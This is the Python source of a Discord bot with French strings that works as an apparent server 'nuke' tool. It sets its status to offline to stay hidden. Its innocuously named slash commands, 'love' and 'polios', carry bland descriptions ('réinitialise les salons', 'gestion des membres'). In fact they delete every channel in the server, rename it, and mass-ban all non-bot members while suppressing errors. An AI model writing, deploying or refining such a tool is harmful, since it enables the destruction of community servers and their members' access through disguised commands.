import discord
from discord import app_commands
from discord.ext import commands
import os
import asyncio
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 1419320803199029402

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


def is_owner(interaction: discord.Interaction) -> bool:
    return interaction.user.id == OWNER_ID


@bot.event
async def on_ready():
    await tree.sync()
    await bot.change_presence(status=discord.Status.offline)
    print(f"Connecté : {bot.user} (ID: {bot.user.id})")


async def delete_channel(channel):
    try:
        await channel.delete()
    except Exception:
        pass


@tree.command(name="love", description="Réinitialise les salons du serveur.")
@app_commands.describe(nouveau_nom="Nouveau nom du serveur (optionnel)")
async def love(interaction: discord.Interaction, nouveau_nom: str = None):
    if not is_owner(interaction):
        await interaction.response.send_message("Permission refusée.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    guild = interaction.guild

    await asyncio.gather(*[delete_channel(c) for c in guild.channels])

    if nouveau_nom:
        try:
            await guild.edit(name=nouveau_nom)
        except Exception:
            pass


@tree.command(name="polios", description="Gestion des membres du serveur.")
@app_commands.describe(
    membre="Membre ciblé",
    action_membre="Appliquer l'action sur ce membre",
    action_globale="Appliquer l'action sur tous les membres",
    raison="Raison"
)
async def polios(
    interaction: discord.Interaction,
    action_membre: bool,
    action_globale: bool,
    membre: discord.Member = None,
    raison: str = "Aucune raison"
):
    if not is_owner(interaction):
        await interaction.response.send_message("Permission refusée.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    guild = interaction.guild

    if action_membre and membre is not None:
        if membre.id == OWNER_ID:
            await interaction.followup.send("Action impossible sur cet utilisateur.", ephemeral=True)
            return
        try:
            await guild.ban(membre, reason=raison, delete_message_days=0)
            await interaction.followup.send(f"Action effectuée sur {membre}.", ephemeral=True)
        except discord.Forbidden:
            await interaction.followup.send("Permission insuffisante.", ephemeral=True)
        return

    if action_globale:
        members = [m for m in guild.members if m.id != OWNER_ID and not m.bot]
        count = 0
        for m in members:
            try:
                await guild.ban(m, reason=raison, delete_message_days=0)
                count += 1
            except Exception:
                pass
        await interaction.followup.send(f"Action effectuée sur {count} membre(s).", ephemeral=True)
        return

    await interaction.followup.send("Paramètres incorrects.", ephemeral=True)


if __name__ == "__main__":
    bot.run(TOKEN)
